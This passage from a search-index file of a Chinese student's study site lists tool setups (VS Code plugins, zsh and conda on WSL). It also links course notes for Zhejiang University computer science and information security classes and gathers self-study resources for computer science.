<li>\u53ef\u4ee5\u5b9e\u73b0\u5e73\u677f\u5bf9\u7535\u8111\u7684\u8fdc\u7a0b\u64cd\u63a7/\u5c4f\u5e55\u6269\u5c55\uff1b</li> <li>\u5c4f\u5e55\u6269\u5c55\u6559\u7a0b<ul> <li>parsecVDisplay<ul> <li>\u5f00\u6e90\u597d\u7528\u7684\u865a\u62df\u5c4f\u521b\u5efa\u8f6f\u4ef6\u3002</li> </ul> </li> </ul> </li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#iii","title":"III \u914d\u7f6e","text":"<p>\u53ef\u80fd\u4e4b\u540e\u4e3a\u4e0b\u9762\u7684\u914d\u7f6e\u5404\u51fa\u4e00\u7bc7 begin \u7cfb\u5217\u4ecb\u7ecd\uff0c\u5148\u653e\u8fd9\u5427\u3002</p>","tags":["collection"]},{"location":"collection/Tools/#iii1-vscode","title":"III.1 vscode \u63d2\u4ef6/\u914d\u7f6e","text":"<p>\u6709\u65f6\u5019\u53ea\u8bb0\u5f97\u81ea\u5df1\u7528\u8fc7\uff0c\u4f46\u662f\u600e\u4e48\u8bbe\u7f6e/\u8c03\u4e86\u54ea\u4e9b\u662f\u4e00\u70b9\u4e0d\u8bb0\u5f97\u4e86\uff1b\u5bf9\u4e8e python\u3001c++\u7b49\u76f8\u5173\u63d2\u4ef6\u90fd\u5f88\u719f\uff0c\u5c31\u4e0d\u8bb2\u4e86\u3002</p> <ul> <li>Cody<ul> <li>\u514d\u8d39\u91cc\u9762\u6700\u597d\u7528\u7684\uff1f</li> </ul> </li> <li>codesnap<ul> <li>\u4ee3\u7801\u622a\u56fe\uff1b</li> </ul> </li> <li>verilog<ul> <li>verilog \u57fa\u672c\u8bed\u6cd5\u7ea0\u9519/\u4ee3\u7801\u9ad8\u4eae</li> </ul> </li> <li>background<ul> <li>\u8ba9\u4f60\u7684 vscode \u4e0d\u90a3\u4e48\u5355\u8c03</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#iii2-linux","title":"III.2 Linux","text":"<p>\u51c6\u786e\u6765\u8bf4\u6211\u4f7f\u7528\u7684\u662f WSL \u3002</p>","tags":["collection"]},{"location":"collection/Tools/#iii21-zsh","title":"III.2.1 zsh","text":"<ul> <li>zsh \u5b89\u88c5\u4e0e\u4f7f\u7528</li> <li>NerdFont \u5728WSL2 \u4e0a\u5b89\u88c5</li> <li>zsh\u6280\u5de7\u2014\u2014devv\u7684\u56de\u7b54</li> <li>zsh\u5378\u8f7d</li> </ul>","tags":["collection"]},{"location":"collection/Tools/#iii22-conda","title":"III.2.2 conda","text":"<ul> <li>conda\u4ecb\u7ecd</li> <li>miniconda \u5b89\u88c5</li> </ul> set auto_activate<pre><code>conda config --set auto_activate_base false # true\nconda config --add channels conda-forge # add channel\n</code></pre>","tags":["collection"]},{"location":"collection/Tools/#iii23-other","title":"III.2.3 Other","text":"<ul> <li>advcpmv</li> <li>volatility \u914d\u7f6e</li> </ul>","tags":["collection"]},{"location":"collection/Tools/#iv-others","title":"IV Others","text":"<ul> <li>WayToAGI &gt; \u5de5\u5177<ul> <li>AI\u5de5\u5177\u7bb1</li> <li>AI Tools &amp; Software</li> </ul> </li> <li>AI\u5de5\u5177\u96c6</li> <li>A.tool</li> <li>tonycrane's toolbox</li> <li>lddgo</li> <li>Tboxn</li> <li>eureka</li> </ul>","tags":["collection"]},{"location":"collection/articles/","title":"Articles","text":"","tags":["collection"]},{"location":"collection/articles/#_1","title":"\u77e5\u8bc6\u7c7b","text":"<ul> <li>huffman-tree &amp; Visual Information Theory<ul> <li>\u54c8\u592b\u66fc\u6811/\u7f16\u7801 &amp; \u4fe1\u606f\u8bba/\u4ea4\u53c9\u71b5</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/articles/#_2","title":"\u7d20\u517b\u7c7b","text":"<ul> <li>Why you should use <code>python -m pip</code></li> </ul>","tags":["collection"]},{"location":"collection/articles/#_3","title":"\u5de5\u5177\u7c7b","text":"<ul> <li>Windows 11\u7cfb\u7edfcmd\u7ec8\u7aef\u7f8e\u5316\u3001Vscode\u7ec8\u7aef\u7f8e\u5316</li> <li>macOS \u5b89\u88c5 sunshine</li> </ul>","tags":["collection"]},{"location":"collection/note_link/","title":"Note link","text":"<p>\u590d\u4e60\u8001\u662f\u5728\u627e\u7b14\u8bb0\u7684\u8def\u4e0a\u2026\u2026\u6240\u4ee5\u60f3\u628a\u81ea\u5df1\u7528\u8fc7\u7684\u7b14\u8bb0\u94fe\u63a5\u96c6\u6210\u5728\u8fd9\uff0c\u6240\u6709\u52aa\u529b\u5747\u7531\u5404\u4f4d\u5927\u4f6c\u4ed8\u51fa\uff0c\u6211\u57fa\u672c\u53ea\u662f\u4e00\u4e2a\u642c\u8fd0\u5de5 \ud83d\ude00\uff08\u57fa\u4e8e ZJU 2023 \u7ea7\u4fe1\u606f\u5b89\u5168\u57f9\u517b\u65b9\u6848\uff09\u3002</p> <p>\u6765\u6e90\u7e41\u591a\uff0c\u5982\u8ba4\u4e3a\u6709\u4e0d\u5f53\u4e4b\u5904\u8fd8\u8bf7\u8bc4\u8bba\u533a\u7559\u8a00\u6216\u8005\u8054\u7cfb\u6211\u5220\u9664\u3002</p> <p>\u4e00\u4e9b\u6253\u7b97\u4e0a\u7684\u8bfe\u7684\u7b14\u8bb0\u4e5f\u53ef\u80fd\u5728\u8fd9\u91cc\uff0c\u4f46\u662f\u4e0d\u80fd\u591f\u4fdd\u8bc1\u6bd4\u8f83\u597d\uff0c\u6700\u540e\u4f1a\u7559\u4e0b\u5bf9\u6211\u5e2e\u52a9\u6700\u5927\u7684\u4e00\u4e9b\u7b14\u8bb0\uff1b\u91c7\u7528\u5012\u53d9\uff0c\u6bd5\u7adf\u5bf9\u4e8e\u6211\u81ea\u5df1\u6765\u8bf4\u201c\u65f6\u95f4\u4e0a\u201d\u8d8a\u540e\u9762\u7684\u7ffb\u5f97\u8d8a\u591a\u3002</p> <p>\u8fd9\u91cc\u662f\u4fee\u4f6c\u7edf\u7b79\u7684\u5404\u8def\u795e\u4ed9~</p>","tags":["collection","note"]},{"location":"collection/note_link/#_1","title":"\u5927\u4e09","text":"","tags":["collection","note"]},{"location":"collection/note_link/#_2","title":"\u8ba1\u7b97\u673a\u7f51\u7edc","text":"<ul> <li>\u54b8\u9c7c\u8086-\u8ba1\u7b97\u673a\u7f51\u7edc</li> <li>Isshiki\u4fee's Notebook</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_3","title":"\u7f16\u8bd1\u539f\u7406","text":"<ul> <li>Transcription-Malfunctioned - CP.pdf</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_4","title":"\u5bc6\u7801\u5b66\u8fdb\u9636","text":"<ul> <li>\u300c\u5bc6\u7801\u5b66\u57fa\u7840\u300d\u5b66\u4e60\u7b14\u8bb0</li> <li>\u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_5","title":"\u8f6f\u4ef6\u5b89\u5168","text":"<ul> <li>RyanFrc - ZJU</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_6","title":"\u5927\u4e8c\u4e0b","text":"","tags":["collection","note"]},{"location":"collection/note_link/#_7","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e09","text":"<ul> <li>HengZhao's Knowledge Base</li> <li>HowJul\u7684\u5b66\u4e60\u7b14\u8bb0</li> <li>\u5e76\u975e\u9a97\u4eba\u7eb8</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_8","title":"\u4eba\u5de5\u667a\u80fd\u5b89\u5168","text":"<ul> <li>\u91d1\u9c7c\u9a6c\u7684\u4eba\u5de5\u667a\u80fd\u5b89\u5168\u7b14\u8bb0</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_9","title":"\u4e66\u7c4d","text":"<ul> <li>\u4eba\u5de5\u667a\u80fd\uff1a\u6570\u636e\u4e0e\u6a21\u578b\u5b89\u5168</li> <li>Introduction to AI Safety, Ethics, and Society</li> <li>Interpretable Machine Learning<ul> <li>\u4e2d\u6587\u7ffb\u8bd1</li> </ul> </li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_10","title":"\u6570\u636e\u5efa\u6a21\u4e0e\u5206\u6790","text":"<ul> <li>slx's notebook</li> <li> <p>HengZhao's Knowledge Base</p> </li> <li> <p>HobbitQia's repo</p> </li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_11","title":"\u6570\u636e\u5e93\u7cfb\u7edf","text":"<ul> <li>CS-Notes \u9762\u8bd5\u7b14\u8bb0-\u6570\u636e\u5e93</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_12","title":"\u6bdb\u6982","text":"<ul> <li>from RyanFcr</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_13","title":"\u5927\u4e8c\u4e0a","text":"","tags":["collection","note"]},{"location":"collection/note_link/#ads","title":"\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790 (ADS)","text":"","tags":["collection","note"]},{"location":"collection/note_link/#_14","title":"\u7b14\u8bb0","text":"","tags":["collection","note"]},{"location":"collection/note_link/#_15","title":"\u521d\u5b66","text":"<ul> <li>Isshiki\u4fee's Notebook-ADS</li> <li>\u65f6\u6e05\u5ddd\u7684\u4e2a\u4eba\u4e3b\u9875-ADS</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_16","title":"\u6df1\u5165","text":"<ul> <li>2024\u6625\u590fADS\u8bb2\u4e49<ul> <li>yhwu-is \u4efb ADS \u52a9\u6559\u671f\u95f4\u5199\u7684\u8865\u5145\u8bb2\u4e49\uff0c\u5df2\u83b7\u5f97\u672c\u4eba\u8bb8\u53ef\u3002</li> <li>\u3010\u514d\u8d23\u3011\u4f5c\u8005\u53ca\u6211\u4e0d\u5bf9\u5185\u5bb9\u6b63\u786e\u6027\u505a\u4fdd\u8bc1\uff1b</li> <li>\u3010\u63a8\u9500\u3011\u4f5c\u8005\u5e0c\u671b\u66f4\u591a\u4eba\u770b\u5230\uff1aLALU #\u7ebf\u6027\u4ee3\u6570\uff1a\u672a\u7adf\u4e4b\u7f8e\u3002</li> </ul> </li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_17","title":"\u590d\u4e60","text":"<ul> <li>memset0 - ads</li> <li>Transcription-Malfunctioned - ads</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_18","title":"\u4e60\u9898 &amp; \u771f\u9898","text":"<ul> <li>ADS_problems<ul> <li>\u540c\u65f6\u53ef\u53c2\u8003 Jianjun Zhou's Notebook-ADS_HW</li> <li>mem.ac \u9519\u9898</li> </ul> </li> <li>\u7a0b\u5e8f\u586b\u7a7a\u9898</li> <li>\u4e00\u4e9b ADS \u671f\u672b\u590d\u4e60\u9898</li> <li> <p>\u9762\u5411 ADS \u7684\u8003\u8bd5\u6280\u5de7</p> </li> <li> <p>HowJul\u7684\u5b66\u4e60\u7b14\u8bb0</p> </li> <li>JLY191's github </li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_19","title":"\u5de5\u5177","text":"<ul> <li>Data Structure Visualizations or \u4e2d\u6587\u7248\uff1f<ul> <li>\u6570\u636e\u7ed3\u6784\u53ef\u89c6\u5316</li> </ul> </li> <li>Algorithm Visualizer<ul> <li>\u7b97\u6cd5\u53ef\u89c6\u5316</li> </ul> </li> <li>Algorithms-DataStructures-BigONotation</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#oop","title":"\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u8bbe\u8ba1 (OOP)","text":"","tags":["collection","note"]},{"location":"collection/note_link/#_20","title":"\u7406\u8bba\u5b66\u4e60\u90e8\u5206","text":"<ul> <li>xyx\u7684\u4ee3\u7801\u7a7a\u95f4<ul> <li>xyx \u5b66\u957f\u8bb2\u7684\u53ef\u80fd\u8d85\u51fa\u8fd9\u95e8\u8bfe\u7a0b\u7684\u8003\u6838\u8303\u56f4\uff0c\u4f46\u662f\u80fd\u591f\u8ba9\u6211\u4eec\u5bf9 c++ \u6709\u4e00\u4e2a\u66f4\u6df1\u7684\u7406\u89e3\u3002</li> </ul> </li> <li>HengZhao's Knowledge Base</li> <li>Jerryhzy's Blog</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_21","title":"\u7406\u8bba\u9898\u590d\u4e60\u90e8\u5206","text":"<ul> <li>zhoutimemachine - midterm</li> <li>zhoutimemachine - final_term</li> <li>HowJul\u7684\u5b66\u4e60\u7b14\u8bb0</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_22","title":"\u6570\u636e\u5b89\u5168\u4e0e\u5bc6\u7801\u5b66\u57fa\u7840","text":"<p>\u7531\u4e8e\u8bfe\u6539\uff0c\u8fd9\u90e8\u5206\u4f5c\u4e1a\u5f88\u5c11\uff0c\u8003\u8bd5\u8865\u5929\u4e5f\u627e\u4e0d\u5230\u5f88\u8d34\u5408\u7684\u7b14\u8bb0\u2026\u2026</p> <ul> <li>\u6570\u636e\u5b89\u5168\u4e0e\u5bc6\u7801\u5b66\u57fa\u7840 Cheatsheet &amp; Homework - zzw4257</li> <li>HowJul\u7684\u5b66\u4e60\u7b14\u8bb0</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#ii","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf II","text":"<ul> <li>Darstib's DB</li> <li>\u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c</li> <li>-RyanFcr-\u8ba1\u7b97\u673a\u7cfb\u7edfII</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_23","title":"\u5927\u5b66\u7269\u7406\u5b9e\u9a8c","text":"","tags":["collection","note"]},{"location":"collection/note_link/#_24","title":"\u5b9e\u9a8c","text":"<ul> <li>\u5b9e\u9a8c\u62a5\u544a\uff1a<ul> <li>cc98 \u7ecf\u9a8c\u8d34/\u8d44\u6e90\u7d22\u5f15 \u5c06\u5185\u5bb9\u63d0\u53d6\u51fa\u6765\uff0c\u5c31\u662f\uff1a<ul> <li>\u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4-\u5927\u7269\u5b9e\u9a8c\u62a5\u544a</li> <li>\u53e6\u4e00\u4e2a98\u8d34</li> <li>\u516c\u4f17\u53f7<code>\u67d0\u5305</code></li> <li>zju-icicles-\u5927\u5b66\u7269\u7406\u5b9e\u9a8c</li> </ul> </li> <li>\u629b\u5c04\u4f53\u8fd0\u52a8\u7684\u7167\u76f8\u6cd5\u7814\u7a76</li> </ul> </li> <li>\u5927\u7269\u5b9e\u9a8c\u5904\u7406\u811a\u672c\uff08\u90e8\u5206\uff09<ul> <li>TonyCrane-\u666e\u901a\u7269\u7406\u5b66\u5b9e\u9a8cI \u7ed8\u56fe</li> </ul> </li> <li>\u7ec4\u88c5\u6574\u6d41\u5668 zzzlq2021-1 zzzlq2021-2</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_25","title":"\u671f\u672b","text":"<ul> <li>\u671f\u672b\u590d\u4e60\u7b14\u8bb0</li> <li>\u7eea\u8bba\u8bfe\u8bfe\u4ef6</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#ii_1","title":"\u5927\u5b66\u7269\u7406\u4e59 II","text":"<ul> <li>physics2-problems<ul> <li>\u53c2\u8003 SAVIA\u7684\u5916\u88c5\u4ee3\u8111 \u505a\u7684\u9898\u578b/\u6280\u5de7\u6574\u7406\uff0c\u6b63\u5728\u5b8c\u5584\u4e2d \u2026\u2026</li> </ul> </li> <li>memset0</li> <li>NoughtQ</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_26","title":"\u5927\u4e00\u4e0b","text":"","tags":["collection","note"]},{"location":"collection/note_link/#iv1","title":"IV.1","text":"<ul> <li>SAVIA\u7684\u5916\u88c5\u4ee3\u8111<ul> <li>\u867d\u7136\u662f\u5927\u7269\u7532\u7684\u590d\u4e60\u8d44\u6599\uff0c\u4f46\u662f\u8d28\u91cf\u6bd4\u8f83\u9ad8\uff0c\u633a\u53ef\u4ee5\u7684\u3002</li> </ul> </li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#fds","title":"\u6570\u636e\u7ed3\u6784\u57fa\u7840 (FDS)","text":"<ul> <li>HengZhao's Knowledge Base or  Yaoyaoling's notebook<ul> <li>\u8f83\u8be6\u7ec6\uff0c\u524d\u8005\u5e26 code\uff0c\u540e\u8005\u5e26\u4f8b\u9898</li> </ul> </li> <li>FDS-questions<ul> <li>\u672c\u4eba\u671f\u672b\u590d\u4e60\u6574\u7406\u7684\u90e8\u5206\u9898\u76ee</li> </ul> </li> <li>\u8bda\u4fe1\u6d4b\u8bd5 cyll \u5b98\u65b9\u7b54\u6848<ul> <li>\u8fd9\u4e2a\u7b97\u662f\u4e00\u4e2a\u201c\u76f8\u5173\u8d44\u6599\u201d</li> </ul> </li> <li>Data Structure Visualizations<ul> <li>\u6570\u636e\u7ed3\u6784\u53ef\u89c6\u5316</li> </ul> </li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#i-sys-i","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf I (sys-I)","text":"<ul> <li>\u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c-cs1 and RISC-V \u975e\u7279\u6743\u7ea7 ISA<ul> <li>xg \u7684\u7cfb\u7edf I \u7b14\u8bb0\u3002</li> </ul> </li> </ul> <p>\u5b66\u540e\u611f\uff1a\u524d\u671f\u548c\u8ba1\u903b\u5dee\u4e0d\u591a\uff08\u5927\u81f4\u5230\u65f6\u5e8f\u903b\u8f91\u7535\u8def\uff09\uff0c\u540e\u9762 sys I \u4e3a\u4e86\u548c\u4e4b\u540e\u7684\u5185\u5bb9\u63a5\u8f68\u800c\u5f00\u59cb\u6709\u6240\u4e0d\u540c</p>","tags":["collection","note"]},{"location":"collection/note_link/#_27","title":"\u4fe1\u606f\u5b89\u5168\u539f\u7406\u4e0e\u6570\u5b66\u57fa\u7840\uff08\u79bb\u6563\u6570\u5b66\u4e0e\u6982\u7387\u8bba\uff09","text":"","tags":["collection","note"]},{"location":"collection/note_link/#_28","title":"\u79bb\u6563\u6570\u5b66\u90e8\u5206","text":"<ul> <li>\u54b8\u9c7c\u8086<ul> <li>\u8fd9\u4e2a\uff084 \u5e74\u524d\uff09\u7684\u7b14\u8bb0\u548c\u8001\u5e08 ppt \u4e5f\u662f\u57fa\u672c\u4e00\u81f4\u3002</li> </ul> </li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_29","title":"\u6982\u7387\u8bba\u90e8\u5206\uff08\u6982\u7387\u8bba\u4e0e\u6570\u7406\u8bba\u7edf\u8ba1\uff09","text":"<p>\u4f3c\u4e4e\u6ca1\u8c01\u7b14\u8bb0\u8be6\u7ec6\u8bb2\u8fd9\u95e8\u8bfe\u7684\u6982\u7387\u8bba\u90e8\u5206\uff0c\u54b8\u9c7c\u8086\u90e8\u5206\u53c8\u7565\u663e\u6d53\u7f29\uff0c\u6240\u4ee5\u501f\u5176\u4ed6\u8bfe\u7a0b\u7b14\u8bb0\u4e00\u7528\uff1b\u4e8b\u5b9e\u4e0a\uff0c\u671f\u672b\u8003\u5bdf\u7684\u5185\u5bb9\u5e76\u6ca1\u6709\u90a3\u4e48\u591a\u3002</p> <ul> <li>-Isshiki\u4fee's Notebook</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_30","title":"\u9a6c\u514b\u601d\u4e3b\u4e49\u539f\u7406","text":"<ul> <li>Bowling's TechStack</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_31","title":"\u5927\u4e00\u4e0a","text":"","tags":["collection","note"]},{"location":"collection/note_link/#_32","title":"\u7ebf\u6027\u4ee3\u6570","text":"<ul> <li>Linear-Algebra-Left-Undone<ul> <li>\u8fdb\u53bb\u770b\u770b\u5c31\u77e5\u9053\u4e86\ud83d\ude0f</li> </ul> </li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#_33","title":"\u53c2\u8003\u8d44\u6599","text":"","tags":["collection","note"]},{"location":"collection/note_link/#general-notebooks-links","title":"General Notebooks links","text":"<ul> <li>Isshiki\u4fee's Notebook</li> <li>HowJul\u7684\u5b66\u4e60\u7b14\u8bb0</li> <li>HengZhao's Knowledge Base</li> <li>Jiepeng's notes</li> <li>Jianjun Zhou's Notebook</li> <li>MinJoker's Notebook</li> <li>Yaoyaoling's notebook</li> <li>\u65f6\u6e05\u5ddd\u7684\u7b14\u8bb0\u672c</li> <li>GoPoux \u7684\u7b14\u8bb0\u672c</li> <li>UCB student's note with CS 61A/61B/70/162/168/186/</li> </ul>","tags":["collection","note"]},{"location":"collection/note_link/#repositories-links","title":"Repositories links","text":"<ul> <li>Transcription-Malfunctioned</li> <li>Tian42chen</li> <li>RyanFcr</li> <li>Zhang-Each</li> <li>JLY191</li> <li>\u4e00\u4e9b\u7535\u5b50\u4e66</li> </ul>","tags":["collection","note"]},{"location":"collection/teachyourselfcs/","title":"Teachyourselfcs","text":"<p>\u8fd9\u4e2a\u540d\u5b57\u6765\u6e90\u4e8e Teach Yourself Computer Science\u3002</p> <ul> <li>Self-taught developer success stories</li> </ul>","tags":["collection"]},{"location":"collection/teachyourselfcs/#i","title":"I \u7f16\u7a0b\u7b97\u6cd5","text":"<p>\u57fa\u672c\u7684\u6559\u7a0b\u592a\u591a\u4e86\uff0c\u6211\u7684\u5efa\u8bae\u662f\u5927\u81f4\u638c\u63e1\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\uff08\u8fc7\u5b8c\u4e00\u904d\u6570\u636e\u7c7b\u578b/\u8bed\u6cd5\uff09\u4e4b\u540e\u5f80\u540e\u770b\u7b97\u6cd5\uff0c\u9047\u5230\u4e0d\u61c2\u7684\u518d\u53bb\u67e5\u3002</p>","tags":["collection"]},{"location":"collection/teachyourselfcs/#i1","title":"I.1 \u6570\u636e\u7ed3\u6784&amp;\u7b97\u6cd5","text":"<ul> <li>hello-algo<ul> <li>\u9002\u5408\u521d\u5b66\u8005\u7684\u7b97\u6cd5\u5b66\u4e60\u5e73\u53f0\uff1b</li> <li>\u6bd4\u8f83\u53ef\u60dc\u53d1\u73b0\u65f6 FDS \u5df2\u7ecf\u4e0a\u5b8c\u4e86\uff0c\u5c5e\u4e8e\u662f\u534a\u540a\u5b50\u6c34\u5e73\uff0c\u4f46\u5f88\u96be\u7ed9\u51fa\u65f6\u95f4\u7cfb\u7edf\u5b66\u4e60\u7b97\u6cd5\u4e86\u3002</li> </ul> </li> <li>LeetCode \u7b97\u6cd5\u901a\u5173\u6307\u5357<ul> <li>\u7c7b\u4e0a\uff0c\u57fa\u4e8e\u5728 LeetCode \u4e0a\u7684\u9898\uff1b\u4f7f\u7528 python\u3002</li> </ul> </li> <li>LeetCode 101<ul> <li>\u7c7b\u4e0a\uff0c\u57fa\u4e8e\u5728 LeetCode \u4e0a\u7684\u9898\uff1b\u4f7f\u7528 C++\u3002</li> </ul> </li> <li>leetcode_problem_rating<ul> <li>zerotrac \u5bf9\u4e8e\u90e8\u5206 LeetCode \u9898\u57fa\u4e8e\u96be\u5ea6\u7684\u6392\u5e8f\uff0c\u7531\u96be\u5230\u5bb9\u6613\uff0c\u9002\u5408\u5237\u9898\u5165\u95e8</li> </ul> </li> <li>-labuladong \u7684\u7b97\u6cd5\u7b14\u8bb0<ul> <li>\u534a\u514d\u8d39\uff0c\u53ef\u4ee5\u770b\u770b\u4ed6\u7684\u63d2\u4ef6</li> </ul> </li> <li>OI wiki<ul> <li>\u201cOI Wiki\u00a0\u81f4\u529b\u4e8e\u6210\u4e3a\u4e00\u4e2a\u514d\u8d39\u5f00\u653e\u4e14\u6301\u7eed\u66f4\u65b0\u7684\u00a0\u7f16\u7a0b\u7ade\u8d5b\uff08competitive programming\uff09\u00a0\u77e5\u8bc6\u6574\u5408\u7ad9\u70b9\u201d\u3002</li> </ul> </li> <li>-CodeForce<ul> <li>\u8fd9\u5c31\u662f ACM \u7237\u7684\u4e3b\u573a\u4e86\u3002</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/teachyourselfcs/#i2","title":"I.2 \u7f16\u7a0b\u8bed\u8a00","text":"<ul> <li>python<ul> <li>Python-100-Days</li> </ul> </li> <li>Rust<ul> <li>Rust \u5b98\u65b9\u6587\u6863</li> <li>Rust \u4e2d\u6587\u6559\u7a0b<ul> <li>\u5e94\u8be5\u4f1a\u6bd4\u5b98\u65b9\u6587\u6863\u53cb\u5584\u4e00\u70b9\uff1f</li> </ul> </li> </ul> </li> <li>C \u8bed\u8a00\u5237\u9898\uff08\u9664\u975e\u521a\u5b66 C \u51e0\u4e2a\u6708\uff0c\u4e0d\u7136\u6ca1\u592a\u5927\u5fc5\u8981\uff09<ul> <li>PAT Solution</li> <li>PAT Solution in C</li> </ul> </li> <li>\u9c7c\u76ae\u7684\u7f16\u7a0b\u5b9d\u5178<ul> <li>\u6709\u4e0d\u5c11\u79cd\u8bed\u8a00\uff0c\u53ef\u80fd\u4f1a\u66f4\u52a0\u9762\u5411\u5de5\u4f5c?</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/teachyourselfcs/#i3","title":"I.3 \u5b9e\u7528\u6280\u80fd","text":"<p>\u89c1 MIT \u7cfb\u5217\u3002</p>","tags":["collection"]},{"location":"collection/teachyourselfcs/#ii","title":"II \u81ea\u5b66\u6307\u5357","text":"<ul> <li>\u5927\u5b66\u751f\u5b58\u6307\u5357<ul> <li>HDU \u7248<ul> <li>\u9002\u5408\uff08\u76f8\u6bd4\u4e8e\u5317\u4eac\u5927\u5b66\u5b66\u5b50\uff09\u6c34\u5e73\u66f4\u4f4e\u7684\u540c\u5b66</li> <li>\u5982\u679c\u662f\u521a\u63a5\u89e6 CS \u7684\u540c\u5b66\uff0c\u975e\u5e38\u63a8\u8350\uff0c\u6709\u5f88\u591a\u786e\u5b9e\u662f\u6211\u4e2a\u4eba\u6478\u7d22\u4e86\u4e00\u5e74\u624d\u9010\u6e10\u53d1\u73b0\u7684\u4e1c\u897f\uff0c\u6709\u70b9\u540e\u6094\u6ca1\u80fd\u65e9\u70b9\u53d1\u73b0</li> </ul> </li> <li>\u4e0a\u6d77\u4ea4\u901a\u5927\u5b66\u751f\u5b58\u624b\u518c</li> </ul> </li> <li>CS \u81ea\u5b66\u6307\u5357<ul> <li>\u201c\u662f\u4e00\u4efd\u732e\u7ed9\u5317\u5927\u4fe1\u79d1\u5b66\u5f1f\u5b66\u59b9\u4eec\u7684\u793c\u7269\u3002\u201d</li> <li>cs-video-courses</li> </ul> </li> <li>zju-cs-asio<ul> <li>ZJU \u201c\u8001\u4e00\u8f88\u201d\u7684\u8bfe\u7a0b\u7b14\u8bb0</li> <li>\u5b9e\u7528\u6280\u80fd\u62fe\u9057</li> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357</li> <li>\u63a8\u8350\u9605\u8bfb<ul> <li>\u5b9e\u7528\u5de5\u5177\u63a8\u8350</li> <li>\u6210\u4e3a\u4e00\u4e2a\u5408\u683c\u7684 CS \u4eba</li> </ul> </li> </ul> </li> <li>career-plan</li> </ul>","tags":["collection"]},{"location":"collection/teachyourselfcs/#iii","title":"III \u5927\u5b66\u8bfe\u7a0b","text":"<p>\u5f88\u591a\u5185\u5bb9\u5728 CS\u81ea\u5b66\u6307\u5357\u4e2d\u5f88\u660e\u767d\u4e86\uff0c\u8fd9\u91cc\u8865\u5145\u4e00\u4e9b\u5176\u6ca1\u6709\u52a0\u5165\u7684\u5185\u5bb9\uff1b\u90e8\u5206\u8bfe\u7a0b\u8d44\u6e90\u96be\u83b7\u53d6\uff0c\u53ef\u4ee5\u770b\u770b learncs \u7559\u6863\u7684\u51e0\u95e8\u8bfe\u3002</p> <ul> <li>\u7ebf\u6027\u4ee3\u6570\u7684\u672c\u8d28 - \u7cfb\u5217\u5408\u96c6</li> <li>CS:APP3e<ul> <li>CMU \u57fa\u4e8e CSAPP(Computer Systems: A Programmer's Perspective) \u5f00\u8bbe\u7684\u5173\u4e8e\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u8bfe\u7a0b\uff0c\u7535\u5b50\u4e66\u7f51\u4e0a\u5f88\u591a\uff0c\u7eb8\u8d28\u4e66\u4e5f\u662f\u4e0d\u9519\u7684\u9009\u62e9\u3002\u867d\u7136\u8be5\u4e66/\u8bfe\u7a0b\u8d6b\u8d6b\u6709\u540d\uff0c\u4f46\u65e0\u5948\u65f6\u95f4\u6709\u4e9b\u4e45\u8fdc\uff0c\u4ef7\u503c\u9700\u8981\u91cd\u65b0\u8003\u91cf\u3002</li> <li>\u5b98\u65b9 Labs \u7f51\u9875</li> <li>CS\u81ea\u5b66\u6307\u5357\u4e0a\u4e5f\u6709\u8be5\u8bfe\u7a0b</li> <li>B \u7ad9\u642c\u8fd0\u7684 CMU \u8bfe\u7a0b\u89c6\u9891\uff1a<ul> <li>2015 CMU 15-213 CSAPP \u6df1\u5165\u7406\u89e3\u8ba1\u7b97\u673a\u7cfb\u7edf \u8bfe\u7a0b\u89c6\u9891<ul> <li>\u4eba\u5de5\u4e2d\u6587\u5b57\u5e55\uff1b</li> </ul> </li> <li>\u3010\u5f3a\u70c8\u63a8\u8350\u3011\u6df1\u5165\u7406\u89e3\u8ba1\u7b97\u673a\u7cfb\u7edf - \u539f\u4e66\u4f5c\u8005\u6388\u8bfe\u89c6\u9891<ul> <li>\u5e26\u6709 CMU \u8bfe\u7a0b\u52a9\u6559\u7684 Lab \u8bb2\u89e3\u89c6\u9891\uff1b</li> </ul> </li> </ul> </li> 